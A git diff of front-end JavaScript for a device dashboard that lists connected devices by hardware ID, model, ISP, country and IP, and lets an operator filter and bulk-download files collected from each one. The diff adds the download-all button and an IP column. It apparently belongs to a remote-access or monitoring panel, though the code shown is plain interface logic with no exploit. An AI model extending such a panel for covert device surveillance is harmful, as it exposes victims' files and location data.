@@ -41,6 +41,17 @@ function createFileListItem(file) {
     return li;
 }
 
+// index.js
+
+document.getElementById('downloadAllButton').addEventListener('click', function() {
+    //const id = prompt("Enter the ID to download all files:");
+    if (selectedId) {
+        window.location.href = `/download-all/${selectedId}`;
+    } else {
+        alert('Please select a device to download all files.');
+    }
+});
+
 async function fetchFiles() {
     await fetch('/files')
         .then(response => response.json())
@@ -163,7 +174,6 @@ async function getInfo(id){
                         selectedId = data[i]
                         filterFiles()
                     }
-
                     tmp += `<div class="info">
                     <span>${i} :</span>
                     <span>${data[i]}</span>
@@ -176,23 +186,33 @@ async function getInfo(id){
     }else{
         CurrentDevice = ""
         infos.innerHTML = '<div class="info"> <span>DeviceName : </span> <span>--</span> </div> <div class="info"> <span>Country :</span> <span>--</span> </div> <div class="info"> <span>ISP :</span> <span>--</span> </div> <div class="info"> <span>IP :</span> <span>--</span> </div> <div class="info"> <span>Brand :</span> <span>--</span> </div> <div class="info"> <span>Model :</span> <span>--</span> </div> <div class="info"> <span>Manufacture :</span> <span>--</span> </div> <div class="info"> <span>HWID :</span> <span>--</span> </div> <div class="info"> <span>isOnline :</span> <span>--</span> </div>'
+        fileList.innerHTML = '';
+        fetchFiles()
     }
 }
 
 async function filterFiles(date) {
     deviceId = selectedId;
+    fileList.innerHTML = '';
     await fetchFiles();
     const filteredFiles = [];
     const files = Array.from(fileList.querySelectorAll('li'));
     files.forEach(file => {
         const name = file.textContent.trim();
         const fileId = name.split(' | ')[0];
-        //const fileDate = name.split(' | ')[2];
         const fileDate = name.split(' | ')[2].split('.').slice(0, -1).join('.');
-        if (fileId === deviceId && fileDate === date) {
+        if (fileId === deviceId && !date) {
             filteredFiles.push(file);
-        } else if (fileId === deviceId && !date) {
+            console.log("fileId === deviceId && !date")
+        } else if (fileId === deviceId && fileDate === date) {
             filteredFiles.push(file);
+            console.log("fileId === deviceId && fileDate === date")
+        } else if (!deviceId && fileDate === date) {
+            filteredFiles.push(file);
+            console.log("!deviceId && fileDate === date")
+        } else if (!deviceId && !date) {
+            filteredFiles.push(file);
+            console.log("!deviceId && !date")
         }
     });
     fileList.innerHTML = '';
@@ -241,6 +261,7 @@ socket.on("info",(data)=>{
             <td>${i.HWID}</td>
             <td>${i.DeviceName}</td>
             <td>${i.Model}</td>
+            <td>${i.IP}</td>
             <td bgcolor="${i.isOnline===1 ? "#90EE90" : "#FF7F7F"}">${i.isOnline===1 ? "Online" : "Offline"}</td>
         `;
         userList.querySelector('tbody').appendChild(row);
